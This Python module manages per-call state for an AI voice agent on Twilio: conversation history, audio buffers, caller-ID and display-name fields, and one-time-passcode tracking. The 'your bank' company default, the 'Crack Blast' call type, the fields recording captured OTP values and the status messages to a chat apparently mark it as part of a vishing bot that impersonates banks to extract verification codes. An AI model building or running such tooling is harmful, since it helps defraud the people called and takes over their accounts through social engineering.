"""
Per-call session management: conversation history, audio buffer, context.
Stores call-specific data for AI personalization.
Supports all call types: Normal, Manual, Custom, AI Emotion, Crack Blast.
"""

from __future__ import annotations

import logging
import threading
from datetime import datetime
from typing import Any, Dict, List, Optional

logger = logging.getLogger(__name__)


class CallSession:
    """Represents a single Twilio call session with explicit runtime state."""

    def __init__(self, call_sid: str, user_id: Optional[str] = None, chat_id: Optional[int] = None):
        self.call_sid = call_sid
        self.user_id = user_id
        self.chat_id = chat_id

        # Setup values
        self.name = "Customer"
        self.company = "your bank"
        self.voice_id = None
        self.voice_name = None
        self.custom_script = None
        self.code_length = 6
        self.emotion = "neutral"
        self.language = None
        self.delivery = None
        self.verification_type = None
        self.verification_purpose = None
        self.business_type = None
        self.region = None
        self.call_type = "normal"
        self.mode_label = "AI Call"
        self.caller_id = None
        self.from_name = None

        self.status = "in-progress"
        self.answered_by = None
        self.status_chat_id = chat_id
        self.status_message_id = None
        self.endpoints_hit: List[str] = []
        self.expected_otp = None

        # Runtime call state
        self.call_stage = None
        self.current_goal = "Begin security verification and confirm the customer's identity."
        self.conversation_summary = "Call started."
        self.customer_verified = False
        self.verification_complete = False
        self.otp_status = "waiting"
        self.otp_attempts = 0
        self.max_attempts = 3
        self.current_otp = None
        self.last_agent_message = None
        self.last_customer_message = None
        self.last_activity_time = datetime.utcnow()
        self.call_started_at = datetime.utcnow()
        self.call_completed = False
        self.end_reason = None

        # Conversation history and buffers
        self.history: List[Dict[str, str]] = []
        self.audio_buffer = bytearray()
        self.last_response = None
        self.otp_captured = False
        self.otp_value = None

        # Manual/Custom-specific
        self.script_delay = 0
        self.gather_digits = 0
        self.fallback_message = ""

        # Lifecycle milestone tracking for one-time logs per call
        self.milestones_logged: Dict[str, bool] = {}

        # Extra compatibility data
        self._extra_data: Dict[str, Any] = {}

    def __getitem__(self, key: str) -> Any:
        if key in self.__dict__:
            return self.__dict__[key]
        return self._extra_data[key]

    def __setitem__(self, key: str, value: Any) -> None:
        if key in self.__dict__:
            self.__dict__[key] = value
        else:
            self._extra_data[key] = value

    def __contains__(self, key: str) -> bool:
        return key in self.__dict__ or key in self._extra_data

    def get(self, key: str, default: Any = None) -> Any:
        if key in self.__dict__:
            return self.__dict__.get(key, default)
        return self._extra_data.get(key, default)

    def pop(self, key: str, default: Any = None) -> Any:
        if key in self.__dict__:
            return self.__dict__.pop(key, default)
        return self._extra_data.pop(key, default)

    def setdefault(self, key: str, default: Any = None) -> Any:
        if key in self.__dict__:
            return self.__dict__.setdefault(key, default)
        return self._extra_data.setdefault(key, default)

    def items(self):
        return {**self.__dict__, **self._extra_data}.items()

    def to_dict(self) -> dict:
        """Serialize session state for debugging/logging."""
        data = {
            "call_sid": self.call_sid,
            "user_id": self.user_id,
            "chat_id": self.chat_id,
            "name": self.name,
            "company": self.company,
            "voice_id": self.voice_id,
            "voice_name": self.voice_name,
            "emotion": self.emotion,
            "language": self.language,
            "delivery": self.delivery,
            "verification_type": self.verification_type,
            "verification_purpose": self.verification_purpose,
            "business_type": self.business_type,
            "region": self.region,
            "code_length": self.code_length,
            "call_type": self.call_type,
            "mode_label": self.mode_label,
            "call_stage": self.call_stage,
            "current_goal": self.current_goal,
            "conversation_summary": self.conversation_summary,
            "customer_verified": self.customer_verified,
            "verification_complete": self.verification_complete,
            "otp_status": self.otp_status,
            "otp_attempts": self.otp_attempts,
            "max_attempts": self.max_attempts,
            "current_otp": self.current_otp,
            "last_agent_message": self.last_agent_message,
            "last_customer_message": self.last_customer_message,
            "last_activity_time": self.last_activity_time.isoformat() if self.last_activity_time else None,
            "call_started_at": self.call_started_at.isoformat() if self.call_started_at else None,
            "call_completed": self.call_completed,
            "end_reason": self.end_reason,
            "status": self.status,
            "answered_by": self.answered_by,
            "status_chat_id": self.status_chat_id,
            "status_message_id": self.status_message_id,
            "endpoints_hit": self.endpoints_hit,
            "expected_otp": self.expected_otp,
            "otp_captured": self.otp_captured,
            "otp_value": self.otp_value,
            "custom_script": self.custom_script,
            "script_delay": self.script_delay,
            "gather_digits": self.gather_digits,
            "fallback_message": self.fallback_message,
            "caller_id": self.caller_id,
            "from_name": self.from_name,
            **self._extra_data,
        }
        return data

    def add_user_message(self, text: str) -> None:
        """Add user input to conversation history and runtime state."""
        self.history.append({"role": "user", "text": text})
        self.last_customer_message = text
        self.last_activity_time = datetime.utcnow()

    def add_agent_message(self, text: str) -> None:
        """Add AI response to conversation history and runtime state."""
        self.history.append({"role": "agent", "text": text})
        self.last_agent_message = text
        self.last_response = text
        self.last_activity_time = datetime.utcnow()

    def get_context(self, limit: int = 6) -> str:
        """Get recent conversation context for AI prompt."""
        recent = self.history[-limit:]
        lines: List[str] = []
        for msg in recent:
            role = "Customer" if msg["role"] == "user" else "Agent"
            lines.append(f"{role}: {msg['text']}")
        return "\n".join(lines)

    def get_call_context(self) -> str:
        """Get structured call setup metadata for AI prompt context."""
        fields = [
            ("Customer Name", self.name),
            ("Company", self.company),
            ("Voice Name", self.voice_name),
            ("Language", self.language),
            ("Delivery Method", self.delivery),
            ("Call Type", self.call_type),
            ("Verification Type", self.verification_type),
            ("Verification Purpose", self.verification_purpose),
            ("Business Type", self.business_type),
            ("Region", self.region),
            ("Verification Code Length", str(self.code_length) if self.code_length else None),
            ("Emotion", self.emotion),
            ("Mode Label", self.mode_label),
            ("Additional instructions", self.custom_script),
        ]
        return "\n".join(f"{name}: {value}" for name, value in fields if value)

    def get_runtime_state(self) -> str:
        """Get structured runtime state for AI prompt context."""
        fields = [
            ("Call Stage", self.call_stage),
            ("Customer Verified", str(self.customer_verified)),
            ("Verification Complete", str(self.verification_complete)),
            ("OTP Status", self.otp_status),
            ("OTP Attempts", f"{self.otp_attempts}/{self.max_attempts}"),
            ("Current Goal", self.current_goal),
            ("Last Agent Message", self.last_agent_message),
            ("Last Customer Message", self.last_customer_message),
            ("Last Activity Time", self.last_activity_time.isoformat() if self.last_activity_time else None),
            ("Call Started At", self.call_started_at.isoformat() if self.call_started_at else None),
            ("Call Completed", str(self.call_completed)),
            ("End Reason", self.end_reason),
        ]
        return "\n".join(f"{name}: {value}" for name, value in fields if value is not None)

    def append_summary(self, summary: str) -> None:
        """Append a concise summary line to the session summary."""
        summary = summary.strip()
        if not summary:
            return
        lines = [line.strip() for line in self.conversation_summary.split("\n") if line.strip()]
        if summary not in lines:
            lines.append(summary)
        self.conversation_summary = "\n".join(lines)

    def set_goal(self, goal: str) -> None:
        self.current_goal = goal.strip()

    def mark_milestone(self, name: str) -> bool:
        """Mark a milestone as emitted once per session."""
        if not name:
            return False
        if self.milestones_logged.get(name):
            return False
        self.milestones_logged[name] = True
        return True

    def complete(self, reason: Optional[str] = None) -> None:
        self.call_completed = True
        self.end_reason = reason
        self.status = "completed"
        self.current_goal = "Call completed."
        self.append_summary("Call completed.")

    def destroy(self) -> None:
        self.history.clear()
        self.audio_buffer.clear()
        self.user_id = None
        self.chat_id = None
        self.name = "Customer"
        self.company = "your bank"
        self.voice_id = None
        self.voice_name = None
        self.custom_script = None
        self.code_length = 6
        self.emotion = "neutral"
        self.language = None
        self.delivery = None
        self.verification_type = None
        self.verification_purpose = None
        self.business_type = None
        self.region = None
        self.call_type = "normal"
        self.mode_label = "AI Call"
        self.caller_id = None
        self.from_name = None
        self.status = "destroyed"
        self.answered_by = None
        self.status_chat_id = None
        self.status_message_id = None
        self.endpoints_hit.clear()
        self.expected_otp = None
        self.call_stage = None
        self.current_goal = ""
        self.conversation_summary = ""
        self.customer_verified = False
        self.verification_complete = False
        self.otp_status = "waiting"
        self.otp_attempts = 0
        self.current_otp = None
        self.last_agent_message = None
        self.last_customer_message = None
        self.last_activity_time = None
        self.call_started_at = None
        self.call_completed = False
        self.end_reason = None
        self.last_response = None
        self.otp_captured = False
        self.otp_value = None
        self.script_delay = 0
        self.gather_digits = 0
        self.fallback_message = ""
        self._extra_data.clear()

    @classmethod
    def from_dict(cls, call_sid: str, data: Dict[str, Any]) -> "CallSession":
        session = cls(call_sid)
        for key, value in data.items():
            if key == "call_sid":
                continue
            session[key] = value
        return session


class SessionManager:
    """Manage all active call sessions with isolation by call SID."""

    def __init__(self):
        self._sessions: Dict[str, CallSession] = {}
        self._lock = threading.RLock()

    def create(self, call_sid: str, user_id: Optional[str] = None, chat_id: Optional[int] = None, **kwargs) -> CallSession:
        if not call_sid:
            raise ValueError("call_sid is required")
        with self._lock:
            session = self._sessions.get(call_sid)
            if session is None:
                session = CallSession(call_sid, user_id=user_id, chat_id=chat_id)
                self._sessions[call_sid] = session
                if session.mark_milestone("SESSION_CREATED"):
                    logger.info("[CALL_MILESTONE] SESSION_CREATED call_sid=%s", call_sid)
            if user_id is not None:
                session.user_id = user_id
            if chat_id is not None:
                session.chat_id = chat_id
            for key, value in kwargs.items():
                session[key] = value
            return session

    def get(self, call_sid: str) -> Optional[CallSession]:
        if not call_sid:
            return None
        with self._lock:
            return self._sessions.get(call_sid)

    def exists(self, call_sid: str) -> bool:
        with self._lock:
            return call_sid in self._sessions

    def pop(self, call_sid: str, default: Any = None) -> Any:
        with self._lock:
            return self._sessions.pop(call_sid, default)

    def cleanup(self, call_sid: str, reason: Optional[str] = None) -> Optional[CallSession]:
        with self._lock:
            session = self._sessions.pop(call_sid, None)
        if session:
            session.complete(reason)
            session.destroy()
        return session

    def complete(self, call_sid: str, reason: Optional[str] = None) -> Optional[CallSession]:
        session = self.get(call_sid)
        if session:
            session.complete(reason)
        return session

    def __getitem__(self, call_sid: str) -> CallSession:
        return self._sessions[call_sid]

    def __setitem__(self, call_sid: str, session: Any) -> None:
        if isinstance(session, CallSession):
            self._sessions[call_sid] = session
        elif isinstance(session, dict):
            self._sessions[call_sid] = CallSession.from_dict(call_sid, session)
        else:
            raise TypeError("SessionManager only accepts CallSession objects or dicts")

    def __contains__(self, call_sid: str) -> bool:
        return call_sid in self._sessions

    def keys(self):
        return self._sessions.keys()

    def values(self):
        return self._sessions.values()

    def items(self):
        return self._sessions.items()


_sessions = SessionManager()


def get_session(call_sid: str) -> CallSession:
    return _sessions.create(call_sid)


def remove_session(call_sid: str) -> None:
    _sessions.cleanup(call_sid)


def get_session_manager() -> SessionManager:
    return _sessions

